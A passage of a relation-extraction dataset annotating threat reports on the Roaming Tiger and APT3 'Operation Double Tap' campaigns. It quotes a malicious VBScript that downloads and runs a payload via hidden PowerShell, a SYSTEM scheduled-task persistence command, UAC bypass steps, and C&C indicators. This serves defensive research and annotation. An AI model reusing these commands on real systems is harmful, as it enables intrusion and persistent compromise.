"P28", "h": 0, "t": 78, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 79, "evidence": [0, 21]}, {"r": "P32", "h": 9, "t": 80, "evidence": [4, 21]}, {"r": "P21", "h": 81, "t": 0, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 82, "evidence": [0, 21]}, {"r": "P32", "h": 9, "t": 83, "evidence": [4, 21]}, {"r": "P21", "h": 84, "t": 0, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 85, "evidence": [0, 21]}, {"r": "P32", "h": 9, "t": 86, "evidence": [4, 21]}, {"r": "P21", "h": 87, "t": 0, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 88, "evidence": [0, 21]}, {"r": "P32", "h": 9, "t": 89, "evidence": [4, 21]}, {"r": "P21", "h": 90, "t": 0, "evidence": [0, 21]}, {"r": "P28", "h": 0, "t": 91, "evidence": [0, 21]}, {"r": "P32", "h": 9, "t": 92, "evidence": [4, 21]}, {"r": "P21", "h": 93, "t": 0, "evidence": [0, 21]}, {"r": "P21", "h": 94, "t": 0, "evidence": [0, 22]}], "title": "201411ESETRoamingTiger", "sents": [["Roaming", "tiger", "Anton", "Cherepanov", "cherepanov@eset.sk", "Intro", "In", "2014", "ESET", "observed", "similar", "attacks", "in", "Russia", "and", "CIS", "countries", ":"], ["Belarus", ",", "Kazakhstan", ",", "Kyrgyzstan", ",", "Tajikistan", ",", "Ukraine", "and", "Uzbekistan", "Similarities", ":", "\u2022", "Same", "infection", "vectors", "\u2022"], ["Use", "of", "RTF", "exploits", "since", "autumn", "of", "2014"], ["\u2022", "Same", "malware", "families", "are", "used", "in", "attacks"], ["\u2022", "Purpose", "is", "to", "steal", "data", "Roaming", "tiger", "group", "Characteristics", "of", "\u201c", "Roaming", "tiger", "\u201d", ":"], ["\u2022", "High", "profile", "victims", "in", "Russia"], ["\u2022", "Use", "of", "RTF", "vulnerabilities", "(", "CVE-2012", "-", "0158", "and", "CVE-2014", "-", "1761", ")"], ["\u2022", "Win32", "/", "Korplug", "(", "aka", "PlugX", "RAT", ")"], ["\u2022", "Win32", "/", "Farfli", ".", "BEK", "(", "aka", "Gh0st", "RAT", ")", "RTF", "exploits", "CVE-2014", "-", "1761", "copied", "from", "the", "same", "template", ":", "CVE-2014", "-", "1761", "is", "poorly", "implemented", "First", "stage", "shellcode", "ca", "n\u2019t", "find", "second", "stage", "shellcode", "\u201c", "p!11\u201d-marker", ":", "Examples", "of", "decoy", "documents", "1/5", "Examples", "of", "decoy", "documents", "2/5"], ["Examples", "of", "decoy", "documents", "3/5", "Examples", "of", "decoy", "documents", "4/5", "Examples", "of", "decoy", "documents", "5/5", "Win32", "/", "Korplug", "tricks", ":", "DLL", "Side", "-", "loading"], ["Digitally", "signed", "executable", "DLL", "file", "File", "with", "raw", "code", "Win32", "/", "Farfli", ".", "BEK", "tricks", ":", "UAC", "bypass", "Step", "1", ":", "\u2022", "Hook", "ntdll", "."], ["NtQueryDirectoryFile", "inside", "explorer.exe"], ["Step", "2", ":"], ["\u2022"], ["Copy", "previously", "dropped", "DLL", "to", "following", "locations", ":", "a", ")", "%"], ["WINDIR%\\system32\\wbem\\loadperf.dll", "(", "WinXP", ")", "b", ")", "%", "WINDIR%\\system32\\migwiz\\wdscore.dll", "(", "Vista+", ")"], ["\u2022", "Execute", "wmiadap.exe(WinXP", ")", "or", "migwiz.exe(Vista+", ")", "Win32", "/", "Farfli", ".", "BEK", "tricks", ":", "Persistence", "1/2", "Win32", "/", "Farfli", ".", "BEK", "drops", "following", "files", ":", "\u2022", "%", "WINDIR%\\AppPatch\\msimain.mui", "\u2013", "raw", "code", "\u2022", "%", "WINDIR%\\AppPatch\\AcProtect.dll", "Drops", "Shim", "DataBase", "&", "registers", "it", ":", "\u2022", "%", "WINDIR%\\AppPatch\\Custom\\%GUID%.sdb", "Win32", "/", "Farfli", ".", "BEK", "tricks", ":", "Persistence", "2/2", "EMET", "-", "style", "sdb", "(", "output", "generated", "using", "sdb", "-", "explorer", "by", "Jon", "Erickson", "):", "44e", "TAG", "7001", "-", "DATABASE"], ["454", "TAG", "4023", "-", "OS_PLATFORM", "45a", "TAG", "6001", "-", "NAME", ":", "AcProtect_Database", "460", "TAG", "9007", "-", "DATABASE_ID", ":", "{", "F8C4CC07", "-", "6DC4", "-", "418F", "-", "B72B-304FCDB64052", "}", "NON", "-", "STANDARD", "476", "TAG", "7002", "-", "LIBRARY", "47c", "TAG", "7004", "-", "SHIM", "482", "TAG", "6001", "-", "NAME", ":", "AcProtect_Shim", "488", "TAG", "600a", "-", "DLLFILE", "48e", "TAG", "7007", "-", "EXE", "494", "TAG", "6001", "-", "NAME", ":", "twunk_32.exe", "49a", "TAG", "6006", "-", "APP_NAME", ":", "AcProtect_Apps", "<", "skipped", ">", "4d4", "TAG", "7007", "-", "EXE", "4da", "TAG", "6001", "-", "NAME", ":", "explorer.exe", "4e0", "TAG", "6006", "-", "APP_NAME", ":", "AcProtect_Apps", "<", "skipped", ">", "Used", "C&C", "servers", "1/2"], ["Server", "IP", "address", "Location", "adobeflashupdate.dynu.com", "122.10.92.14", "Hong", "Kong", "checkpdate.youdontcare.com", "122.10.118.129", "Hong", "Kong"], ["csrss.dnsedc.com", "122.10.118.131", "Hong", "Kong", "dotkang.vicp.net", "122.10.118.131", "Hong", "Kong", "dwm.dnsedc.com", "122.10.118.131", "Hong", "Kong", "gf.arabidc.com", "122.10.83.51", "Hong", "Kong", "kkts.yeshopea.com", "103.225.196.140", "Hong", "Kong", "nativeame2.jkub.com", "103.225.196.140", "Hong", "Kong", "news.bfinancea.net", "122.10.118.129", "Hong", "Kong", "fsvts.vicp.net"], ["futuresgolda.com", "systemupdate5.dtdns.net", "googlenewsup.net", "Used", "C&C", "servers", "2/2"], ["Server", "IP", "address", "Location", "niisvt.f3322.org", "122.10.83.62,103.20.222.170", "Hong", "Kong", "note.wikaba.com", "122.10.83.62", "Hong", "Kong", "systemupdate1.suroot.com", "122.10.92.15", "Hong", "Kong", "systemupdate1.suroot.com", "122.10.92.15", "Hong", "Kong", "vk.newsupdatea.net", "123.254.109.166", "Hong", "Kong", "www.dnsqaz.com", "122.10.83.62", "Hong", "Kong", "www.sizn-ru.com", "122.10.83.62", ",", "122.112.2.14", "Hong", "Kong", "yahoomessenger.flnet.org", "122.10.92.15", "Hong", "Kong", "transactiona.com", "122.10.92.14", "Hong", "Kong", "systemupdate2.etowns.net", "122.10.92.14", "Hong", "Kong", "adobeupdate1.dtdns.net", "122.10.92.15", "Hong", "Kong", "spacecorp.sizn-ru.com"], ["systemupdate3.suroot.com", "Domains", "information", "Updated", "Date", ":", "2014", "-", "07", "-", "28", "17:17:48Z"], ["Creation", "Date", ":", "2014", "-", "07", "-", "28", "17:17:48Z", "Registrant", "Name", ":", "liu", "qiuping", "Registrant", "Organization", ":", "huajiyoutian"], ["Registrant", "City", ":", "Beijing", "Registrant", "State", "/", "Province", ":", "BJ"], ["Registrant", "Postal", "Code", ":", "100191"], ["Registrant", "Country", ":", "CN", "Registrant", "Email", ":", "yuminga1@126.com", "Conclusions", "\u2022"], ["We", "are", "observing", "attacks", "in", "Russia", "and", "CIS", "countries"], ["\u2022"], ["Tip", "of", "the", "iceberg", ":", "just", "one", "group"], ["Steps", "taken", ":", "\u2022", "Composed", "IoC", "\u2022", "Contacted", "CERTs", "Credits", "Special", "thanks", "to", "Cedric", "Gilbert", "cherepanov@eset.sk"]]}, {"vertexSet": [[{"name": "Operation Double Tap", "pos": [0, 3], "sent_id": 0, "type": "Campaign"}], [{"name": "Operation Clandestine Fox", "pos": [15, 18], "sent_id": 0, "type": "Campaign"}], [{"name": "November 19, 2014", "pos": [8, 12], "sent_id": 1, "type": "Time"}], [{"name": "CVE-2014-6332", "pos": [8, 11], "sent_id": 2, "type": "Vulnerability"}], [{"name": "CVE-2014-4113", "pos": [12, 15], "sent_id": 2, "type": "Vulnerability"}], [{"name": "CVE-2014-6332", "pos": [0, 3], "sent_id": 3, "type": "Vulnerability"}], [{"name": "2014-11-11", "pos": [7, 12], "sent_id": 3, "type": "Time"}], [{"name": "CVE-20144113", "pos": [0, 1], "sent_id": 4, "type": "Vulnerability"}], [{"name": "2014-10-14", "pos": [11, 16], "sent_id": 4, "type": "Time"}], [{"name": "CVE-2014-6332", "pos": [3, 6], "sent_id": 5, "type": "Vulnerability"}], [{"name": "CVE-2014-6332", "pos": [4, 7], "sent_id": 18, "type": "Vulnerability"}], [{"name": "CVE-2014-6332", "pos": [1, 4], "sent_id": 25, "type": "Vulnerability"}], [{"name": "install.exe", "pos": [10, 11], "sent_id": 27, "type": "Malware"}], [{"name": "5a0c4e1925c76a959ab0588f683ab437", "pos": [1, 2], "sent_id": 29, "type": "MD5"}], [{"name": "2014-11-19 08:55:10Z", "pos": [6, 12], "sent_id": 29, "type": "Time"}], [{"name": "6b8611f8148a6b51e37fd68e75b6a81c", "pos": [2, 3], "sent_id": 30, "type": "MD5"}], [{"name": "install.exe", "pos": [2, 3], "sent_id": 31, "type": "Malware"}], [{"name": "doc.exe", "pos": [5, 6], "sent_id": 32, "type": "Payload"}], [{"name": "CVE-2014-4113", "pos": [9, 12], "sent_id": 32, "type": "Vulnerability"}], [{"name": "test.exe", "pos": [18, 19], "sent_id": 32, "type": "Payload"}], [{"name": "doc.exe", "pos": [0, 1], "sent_id": 34, "type": "Malware"}], [{"name": "492a839a3bf9c61b7065589a18c5aa8d", "pos": [1, 2], "sent_id": 36, "type": "MD5"}], [{"name": "9342d18e7d315117f23db7553d59a9d1", "pos": [6, 7], "sent_id": 36, "type": "MD5"}], [{"name": "doc.exe", "pos": [0, 1], "sent_id": 37, "type": "Malware"}], [{"name": "744a17a3bc6dbd535f568ef1e87d8b9a", "pos": [1, 2], "sent_id": 38, "type": "MD5"}], [{"name": "2014-11-19 08:25:45Z", "pos": [6, 12], "sent_id": 38, "type": "Time"}], [{"name": "2fab77a3ff40e4f6d9b5b7e813c618e4", "pos": [2, 3], "sent_id": 39, "type": "MD5"}], [{"name": "test.exe", "pos": [3, 4], "sent_id": 39, "type": "Malware"}], [{"name": "5c08957f05377004376e6a622406f9aa", "pos": [1, 2], "sent_id": 40, "type": "MD5"}], [{"name": "2014-11-18 10:49:23Z", "pos": [6, 12], "sent_id": 40, "type": "Time"}], [{"name": "f34d5f2d4577ed6d9ceec516c1f5a744", "pos": [2, 3], "sent_id": 41, "type": "MD5"}], [{"name": "install.exe", "pos": [0, 1], "sent_id": 43, "type": "Malware"}], [{"name": "c:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\MShell\\Release", "pos": [2, 5], "sent_id": 43, "type": "Indicator"}], [{"name": "doc.exe", "pos": [6, 7], "sent_id": 43, "type": "Malware"}], [{"name": "c:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\4113\\Release \\4113.pdb", "pos": [8, 12], "sent_id": 43, "type": "Indicator"}], [{"name": "test.exe", "pos": [12, 13], "sent_id": 43, "type": "Malware"}], [{"name": "C:\\Users\\aa\\Documents\\Visual Studio 2010\\Projects\\MyRat\\Client\\Client \\obj\\x86\\Release\\Client.pdb", "pos": [14, 18], "sent_id": 43, "type": "Indicator"}], [{"name": "CVE-2014-4113", "pos": [15, 18], "sent_id": 44, "type": "Vulnerability"}], [{"name": "192.157.198.103", "pos": [16, 17], "sent_id": 49, "type": "Address"}], [{"name": "192.184.60.229", "pos": [7, 8], "sent_id": 51, "type": "Address"}], [{"name": "198.55.115.71", "pos": [15, 16], "sent_id": 73, "type": "Address"}], [{"name": "Backdoor.APT.CookieCutter", "pos": [9, 12], "sent_id": 74, "type": "Payload"}], [{"name": "Pirpi", "pos": [14, 15], "sent_id": 74, "type": "Payload"}], [{"name": "newnotepad.exe", "pos": [19, 20], "sent_id": 74, "type": "Malware"}], [{"name": "8849538ef1c3471640230605c2623c67", "pos": [22, 23], "sent_id": 74, "type": "MD5"}], [{"name": "inform.bedircati[.]com", "pos": [32, 33], "sent_id": 74, "type": "Indicator"}], [{"name": "pn.lamb-site[.]com", "pos": [33, 36], "sent_id": 74, "type": "Indicator"}], [{"name": "192.184.60.229", "pos": [1, 2], "sent_id": 75, "type": "Address"}], [{"name": "securitywap[.]com", "pos": [11, 12], "sent_id": 75, "type": "Indicator"}], [{"name": "2014-11-17", "pos": [8, 13], "sent_id": 76, "type": "Time"}], [{"name": "2014-11-20", "pos": [13, 18], "sent_id": 76, "type": "Time"}], [{"name": "192.184.60.229", "pos": [18, 19], "sent_id": 76, "type": "Address"}], [{"name": "www.securitywap.com", "pos": [19, 20], "sent_id": 76, "type": "Indicator"}], [{"name": "2014-11-17", "pos": [20, 25], "sent_id": 76, "type": "Time"}], [{"name": "2014-11-20", "pos": [25, 30], "sent_id": 76, "type": "Time"}], [{"name": "192.184.60.229", "pos": [30, 31], "sent_id": 76, "type": "Address"}], [{"name": "join.playboysplus[.]com", "pos": [35, 36], "sent_id": 76, "type": "Indicator"}], [{"name": "104.151.248.173", "pos": [43, 44], "sent_id": 76, "type": "Address"}], [{"name": "join.playboysplus[.]com", "pos": [20, 21], "sent_id": 77, "type": "Indicator"}], [{"name": "2014-11-21", "pos": [21, 26], "sent_id": 77, "type": "Time"}], [{"name": "2014-11-21", "pos": [26, 31], "sent_id": 77, "type": "Time"}], [{"name": "104.151.248.173", "pos": [31, 32], "sent_id": 77, "type": "Address"}], [{"name": "walterclean[.]com", "pos": [32, 33], "sent_id": 77, "type": "Indicator"}], [{"name": "2014-11-18", "pos": [33, 38], "sent_id": 77, "type": "Time"}], [{"name": "2014-11-20", "pos": [38, 43], "sent_id": 77, "type": "Time"}], [{"name": "104.151.248.173", "pos": [43, 44], "sent_id": 77, "type": "Address"}], [{"name": "www.walterclean[.]com", "pos": [44, 45], "sent_id": 77, "type": "Indicator"}], [{"name": "2014-11-18", "pos": [45, 50], "sent_id": 77, "type": "Time"}], [{"name": "2014-11-20", "pos": [50, 55], "sent_id": 77, "type": "Time"}], [{"name": "104.151.248.173", "pos": [55, 56], "sent_id": 77, "type": "Address"}]], "labels": [{"r": "P33", "h": 1, "t": 2, "evidence": [0, 1]}, {"r": "P22", "h": 0, "t": 12, "evidence": [0, 27]}, {"r": "P33", "h": 12, "t": 14, "evidence": [27, 29]}, {"r": "P21", "h": 13, "t": 12, "evidence": [27, 29]}, {"r": "P7", "h": 12, "t": 11, "evidence": [25, 27]}, {"r": "P7", "h": 16, "t": 18, "evidence": [31, 32]}, {"r": "P13", "h": 16, "t": 17, "evidence": [31, 32]}, {"r": "P13", "h": 16, "t": 19, "evidence": [31, 32]}, {"r": "P21", "h": 32, "t": 31, "evidence": [43]}, {"r": "P21", "h": 28, "t": 27, "evidence": [39, 40]}, {"r": "P33", "h": 27, "t": 29, "evidence": [39, 40]}, {"r": "P21", "h": 30, "t": 27, "evidence": [39, 41]}, {"r": "P21", "h": 24, "t": 23, "evidence": [37, 38]}, {"r": "P33", "h": 23, "t": 25, "evidence": [37, 38]}, {"r": "P21", "h": 26, "t": 23, "evidence": [37, 39]}, {"r": "P21", "h": 21, "t": 20, "evidence": [34, 36]}, {"r": "P21", "h": 22, "t": 20, "evidence": [34, 36]}, {"r": "P21", "h": 34, "t": 33, "evidence": [43]}, {"r": "P21", "h": 36, "t": 35, "evidence": [43]}, {"r": "P21", "h": 44, "t": 43, "evidence": [74]}, {"r": "P21", "h": 45, "t": 12, "evidence": [27, 74]}, {"r": "P21", "h": 46, "t": 12, "evidence": [27, 74]}, {"r": "P28", "h": 12, "t": 47, "evidence": [27, 75]}, {"r": "P21", "h": 48, "t": 12, "evidence": [27, 75]}, {"r": "P33", "h": 0, "t": 49, "evidence": [0, 76]}, {"r": "P33", "h": 0, "t": 50, "evidence": [0, 76]}, {"r": "P28", "h": 12, "t": 51, "evidence": [27, 76]}, {"r": "P21", "h": 52, "t": 12, "evidence": [27, 76]}, {"r": "P33", "h": 0, "t": 53, "evidence": [0, 76]}, {"r": "P33", "h": 0, "t": 54, "evidence": [0, 76]}, {"r": "P28", "h": 12, "t": 55, "evidence": [27, 76]}, {"r": "P28", "h": 12, "t": 57, "evidence": [27, 76]}, {"r": "P21", "h": 56, "t": 12, "evidence": [27, 76]}, {"r": "P21", "h": 58, "t": 12, "evidence": [27, 77]}, {"r": "P33", "h": 0, "t": 59, "evidence": [0, 77]}, {"r": "P33", "h": 0, "t": 60, "evidence": [0, 77]}, {"r": "P28", "h": 12, "t": 61, "evidence": [27, 77]}, {"r": "P21", "h": 62, "t": 12, "evidence": [27, 77]}, {"r": "P33", "h": 0, "t": 63, "evidence": [0, 77]}, {"r": "P33", "h": 0, "t": 64, "evidence": [0, 77]}, {"r": "P28", "h": 12, "t": 65, "evidence": [27, 77]}, {"r": "P21", "h": 66, "t": 12, "evidence": [27, 77]}, {"r": "P33", "h": 0, "t": 67, "evidence": [0, 77]}, {"r": "P33", "h": 0, "t": 68, "evidence": [0, 77]}, {"r": "P28", "h": 12, "t": 69, "evidence": [27, 77]}], "title": "201411FireEyeOperationDoubleTap", "sents": [["Operation", "Double", "Tap", "APT3", "(", "also", "known", "as", "UPS", ")", ",", "the", "actors", "responsible", "for", "Operation", "Clandestine", "Fox", "has", "quietly", "continued", "to", "send", "waves", "of", "spearphishing", "messages", "over", "the", "past", "few", "months", "."], ["This", "actor", "initiated", "their", "most", "recent", "campaign", "on", "November", "19", ",", "2014", "targeting", "multiple", "organizations", "."], ["The", "attacker", "leveraged", "multiple", "exploits", ",", "targeting", "both", "CVE-2014", "-", "6332", "and", "CVE-2014", "-", "4113", "."], ["CVE-2014", "-", "6332", "was", "disclosed", "publicly", "on", "2014", "-", "11", "-", "11", "and", "is", "a", "Windows", "OLE", "Automation", "Array", "Remote", "Code", "Execution", "vulnerability", "."], ["CVE-20144113", "is", "a", "privilege", "escalation", "vulnerability", "that", "was", "disclosed", "publicly", "on", "2014", "-", "10", "-", "14", "."], ["The", "use", "of", "CVE-2014", "-", "6332", "is", "notable", ",", "as", "it", "demonstrates", "that", "multiple", "classes", "of", "actors", ",", "both", "criminal", "and", "APT", "alike", ",", "have", "now", "incorporated", "this", "exploit", "into", "their", "toolkits", "."], ["Further", ",", "the", "use", "of", "both", "of", "these", "two", "known", "vulnerabilities", "in", "tandem", "is", "notable", "for", "APT3", "."], ["This", "actor", "is", "historically", "known", "for", "leveraging", "zeroday", "vulnerabilities", "in", "widespread", "but", "infrequent", "phishing", "campaigns", "."], ["The", "use", "of", "known", "exploits", "and", "more", "frequent", "attacks", "may", "indicate", "both", "a", "shift", "in", "strategy", "and", "operational", "tempo", "for", "this", "group", "."], ["The", "Spearphish"], ["The", "body", "of", "the", "message", "is", "below", ":"], ["One", "Month", "'s", "Free", "Membership", "for", "The", "PLAYBOY", "ClUB", "1080P", "HD", "VIDEOS", "100,000", "PHOTOS", "4,000", "MODELS"], ["Nude", "Celebrities", ",", "Playmates", ",", "Cybergirls", "&", "More", "!"], ["Click", "hxxp://join.playboysplus.com/signup/"], ["To", "Get", "a", "Free", "Plus", "Member", "Now", "&", "Never", "Miss", "Another", "Update", "."], ["Your", "Member", "referrals", "must", "remain", "active", "."], ["If", "anyone", "getting", "\"", "Promotion", "not", "available", "\"", "for", "1", "month", "free", "membership", ",", "you", "might", "get", "the", "issue", "up", "to", "48", "hrs", "once", "your", "membership", "is", "expired", "and", "make", "sure", "to"], ["Clear", "out", "cookies", "or", "use", "another", "browser", "or", "use", "another", "PC", "."], ["The", "webpage", "contained", "both", "CVE-2014", "-", "6332", "exploit", "code", "and", "a", "VBScript", "that", "invoked", "PowerShell", "on", "the", "affected", "users", "\u2019", "system", "to", "download", "the", "below", "payload", ":", "function", "runmumaa", "(", ")"], ["On", "Error", "Resume", "Next", "set", "shell", "=", "createobject(\"Shell", "."], ["Application", "\"", ")", "shell", "."], ["ShellExecute", "\"", "powershell.exe\",\"-NoLogo", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden"], ["(", "New", "-", "Object", "\u201c", "System", "."], ["Net", "."], ["WebClient\u201d).DownloadFile(\u201chttp://www.playboysplus.com", "/install", "/", "install.exe\u201d,\u201dinstall.exe\u201d);Invoke", "-", "Item", "install.exe", "\"", ",", "\"", "\"", ",", "\"", "open", "\"", ",", "1", "end", "function"], ["The", "CVE-2014", "-", "6332", "exploit", "code", "seen", "in", "this", "incident", "is", "derived", "from", "the", "code", "published", "at", "http://www.exploit-db.com/exploits/35230/", ",", "which", "has", "also", "been", "incorporated", "in", "the", "Metasploit", "project", "."], ["The", "Downloader"], ["After", "the", "exploit", "or", "script", "executes", ",", "the", "system", "downloads", "install.exe", ",", "which", "has", "the", "following", "metadata", ":"], ["MD5"], ["Size", "5a0c4e1925c76a959ab0588f683ab437", "46592", "bytes", "Compile", "Time", "2014", "-", "11", "-", "19", "08:55:10Z"], ["Import", "Hash", "6b8611f8148a6b51e37fd68e75b6a81c"], ["The", "file", "install.exe", "attempts", "to", "write", "two", "files", "(", "doc.exe", "and", "test.exe", ")", "to", "the", "hard", "-", "coded", "path", "\u201c", "C:\\Users\\Public", "\u201d", ",", "which", "fails", "on", "Windows", "XP", "because", "that", "path", "is", "not", "present", "by", "default", "."], ["The", "first", "dropped", "file", ",", "doc.exe", ",", "contains", "the", "CVE-2014", "-", "4113", "exploit", "and", "then", "attempts", "to", "execute", "test.exe", "with", "the", "elevated", "privileges", "."], ["These", "files", "have", "the", "following", "metadata", ":"], ["doc.exe", "(", "x86", "):"], ["MD5"], ["Size", "492a839a3bf9c61b7065589a18c5aa8d", "12288", "bytes", "Import", "Hash", "9342d18e7d315117f23db7553d59a9d1"], ["doc.exe", "(", "x64", "):", "MD5"], ["Size", "744a17a3bc6dbd535f568ef1e87d8b9a", "13824", "bytes", "Compile", "Time", "2014", "-", "11", "-", "19", "08:25:45Z"], ["Import", "Hash", "2fab77a3ff40e4f6d9b5b7e813c618e4", "test.exe", ":", "MD5"], ["Size", "5c08957f05377004376e6a622406f9aa", "11264", "bytes", "Compile", "Time", "2014", "-", "11", "-", "18", "10:49:23Z"], ["Import", "Hash", "f34d5f2d4577ed6d9ceec516c1f5a744"], ["These", "payload", "files", "also", "have", "interesting", "PDB", "debug", "strings", "."], ["install.exe", ":", "c:\\Users\\aa\\Documents\\Visual", "Studio", "2008\\Projects\\MShell\\Release", "\\MShell.pdb", "doc.exe", ":", "c:\\Users\\aa\\Documents\\Visual", "Studio", "2008\\Projects\\4113\\Release", "\\4113.pdb", "test.exe", ":", "C:\\Users\\aa\\Documents\\Visual", "Studio", "2010\\Projects\\MyRat\\Client\\Client", "\\obj\\x86\\Release\\Client.pdb"], ["The", "most", "interesting", "PDB", "string", "is", "the", "\u201c", "4113.pdb", ",", "\u201d", "which", "appears", "to", "reference", "CVE-2014", "-", "4113", "."], ["This", "CVE", "is", "a", "local", "kernel", "vulnerability", "that", ",", "with", "successful", "exploitation", ",", "would", "give", "any", "user", "SYSTEM", "access", "on", "the", "machine", "."], ["The", "malware", "component", ",", "test.exe", ",", "uses", "the", "Windows", "command", "\"", "cmd.exe", "\"", "/C", "whoami", "\u201d", "to", "verify", "it", "is", "running", "with", "the", "elevated", "privileges", "of", "\u201c", "System", "\u201d", "and", "creates", "persistence", "by", "creating", "the", "following", "scheduled", "task", ":", "schtasks", "/create"], ["/tn", "\"", "mysc", "\"", "/tr", "C:\\Users\\Public\\test.exe"], ["/sc"], ["ONLOGON", "/ru", "\"", "System", "\"", "When", "executed", ",", "the", "malware", "first", "establishes", "a", "SOCKS5", "connection", "to", "192.157.198.103", "using", "TCP", "port", "1913", "."], ["The", "malware", "sends", "the", "SOCKS5", "connection", "request", "\"", "05", "01", "00", "\"", "and", "verifies", "the", "server", "response", "starts", "with", "\"", "05", "00", "\"", "."], ["The", "malware", "then", "requests", "a", "connection", "to", "192.184.60.229", "on", "TCP", "port", "81", "using", "the", "command", "\"", "05"], ["01", "00", "01"], ["c0", "b8", "3c", "e5", "00", "51", "\"", "and", "verifies", "that", "the", "first", "two", "bytes", "from", "the", "server", "are", "\"", "05", "00", "\"", "(", "c0", "b8", "3c", "e5", "is", "the", "IP", "address", "and", "00", "51", "is", "the", "port", "in", "network", "byte", "order", ")", "."], ["Once", "the", "connection", "to", "the", "server", "is", "established", ",", "the", "malware", "expects", "a", "message", "containing", "at", "least", "three", "bytes", "from", "the", "server", "."], ["These", "first", "three", "bytes", "are", "the", "command", "identifier", "."], ["The", "following", "commands", "are", "supported", "by", "the", "malware", ":", "Command", "ID", "Description", "00", "00", "00", "Content", "after", "command", "ID", "is", "written", "to", ":"], ["C:\\Users\\"], ["[", "Username]\\AppData\\Local\\Temp\\notepad1.exe", "00", "00", "01", "Deletes", "the", "files", ":", "C:\\Users\\"], ["[", "Username]\\AppData\\Local\\Temp\\notepad.exe", "C:\\Users\\"], ["[", "Username]\\AppData\\Local\\Temp\\newnotepad.exe", "00", "00", "02", "Malware", "exits", "00", "00", "03", "Malware", "downloads", "the", "URL", "that", "follows", "the", "command", "ID", "."], ["The", "file", "is", "saved", "to", ":"], ["C:\\Users\\"], ["[", "Username]\\AppData\\Local\\Temp\\notepad.exe", "00", "00", "04", "Content", "after", "command", "ID", "is", "written", "to", ":"], ["C:\\Users\\"], ["[", "Username]\\AppData\\Local\\Temp\\notepad2.exe", "00", "00", "05", "The", "files", "notepad1.exe", "and", "notepad2.exe", "are", "concatenated", "together", "and", "written", "to", "C:\\Users\\"], ["[", "Username]\\AppData\\Local\\Temp\\newnotepad.exe", "and", "executed", "00"], ["00", "06"], ["The", "contents", "of", "the", "following", "file", "is", "sent", "to", "the", "server", ":"], ["C:\\Users\\"], ["[", "Username]\\AppData\\Local\\Temp\\note.txt", "00", "00", "07"], ["The", "string", "following", "the", "command", "ID", "is", "executed", "using", "\"", "cmd", "/C", "\"", "and", "results", "are", "sent", "to", "server", "Links", "to", "APT3"], ["On", "October", "28", ",", "we", "observed", "APT3", "sending", "out", "spearphishing", "messages", "containing", "a", "compressed", "executable", "attachment", "."], ["The", "deflated", "exe", "was", "a", "variant", "of", "the", "same", "downloader", "described", "above", "and", "connected", "to", "198.55.115.71", "over", "port", "1913", "via", "SOCKS5", "proxy", "."], ["The", "secondary", "payload", "in", "that", "case", "was", "detected", "as", "Backdoor", ".", "APT.CookieCutter", "(", "aka", "Pirpi", ")", "and", "also", "named", "newnotepad.exe", "(", "MD5", "8849538ef1c3471640230605c2623c67", ")", "and", "connected", "to", "the", "known", "APT3", "domains", ":", "inform.bedircati[.]com", "pn.lamb", "-", "site[.]com", "210.109.99.64"], ["The", "192.184.60.229", "IP", "address", "seen", "in", "this", "current", "campaign", "also", "hosts", "securitywap[.]com", "\u2013", "another", "known", "domain", "referenced", "in", "our", "Operation", "Clandestine", "Fox", "blog", "."], ["DOMAIN", "FIRST", "SEEN", "LAST", "SEEN", "IP", "ADDRESS", "securitywap.com", "2014", "-", "11", "-", "17", "2014", "-", "11", "-", "20", "192.184.60.229", "www.securitywap.com", "2014", "-", "11", "-", "17", "2014", "-", "11", "-", "20", "192.184.60.229", "In", "addition", ",", "the", "join.playboysplus[.]com", "exploit", "and", "payload", "delivery", "site", "resolves", "to", "104.151.248.173", "."], ["This", "IP", "has", "hosted", "other", "domains", "used", "by", "APT3", "in", "past", "campaigns", ":", "DOMAIN", "FIRST", "SEEN", "LAST", "SEEN", "IP", "ADDRESS", "join.playboysplus[.]com", "2014", "-", "11", "-", "21", "2014", "-", "11", "-", "21", "104.151.248.173", "walterclean[.]com", "2014", "-", "11", "-", "18", "2014", "-", "11", "-", "20", "104.151.248.173", "www.walterclean[.]com", "2014", "-", "11", "-", "18", "2014", "-", "11", "-", "20", "104.151.248.173", "As", "we", "discussed", "in", "our", "previous", "blog", "detailing", "previous", "APT3", "activity", ",", "the", "walterclean[.]com", "served", "as", "a", "Plugx", "/", "Kaba", "command", "and", "control", "server", "."], ["Conclusion"], ["Although", "APT3", "is", "well", "known", "for", "employing", "zero", "-", "day", "exploits", "in", "their", "attacks", ",", "recent", "activity", "has", "demonstrated", "that", "they", "will", "also", "attack", "targets", "with", "known", "exploits", "or", "social", "engineering", "."], ["Since", "Operation", "Clandestine", "Fox", ",", "we", "have", "observed", "this", "actor", "execute", "multiple", "attacks", "that", "did", "not", "rely", "on", "zero", "-", "day", "exploits", "."], ["The", "combination", "of", "this", "sustained", "operational", "tempo", "and", "lack", "of", "zero", "-", "day", "exploits", "may", "indicate", "that", "this", "group", "has", "changed", "strategy", "and", "has", "decided", "to", "attack", "more", "frequently", "and", "does", "not", "have", "steady", "access", "to", "zero", "-", "day", "exploit", "code", "."], ["No", "matter", "the", "strategy", ",", "this", "actor", "has", "shown", "an", "ability", "to", "operate", "successfully", "."], ["IOCs", "for", "this", "threat", "can", "be", "found", "here", "."]]}, {"vertexSet": [[{"name": "OnionDuke", "pos": [0, 1], "sent_id": 0, "type": "Malware"}], [{"name": "Russia", "pos": [13, 14], "sent_id": 2, "type": "Country"}], [{"name": "MiniDuke", "pos": [15, 16], "sent_id": 5, "type": "MalwareFamily"}], [{"name": "NATO", "pos": [26, 27], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "European government agencies", "pos": [28, 31], "sent_id": 5, "type": "ExploitTargetObject"}], [{"name": "MiniDuke", "pos": [14, 15], "sent_id": 6, "type": "Malware"}], [{"name": "OnionDuke", "pos": [17, 18], "sent_id": 7, "type": "MalwareFamily"}], [{"name": "a75995f94854dea8799650a2f4a97980b71199d2", "pos": [19, 20], "sent_id": 13, "type": "SHA-1"}], [{"name": "Trojan-Dropper:W32/OnionDuke.A", "pos": [23, 32], "sent_id": 13, "type": "Dropper"}], [{"name": "b491c14d8cfb48636f6095b7b16555e9a575d57f", "pos": [9, 10], "sent_id": 18, "type": 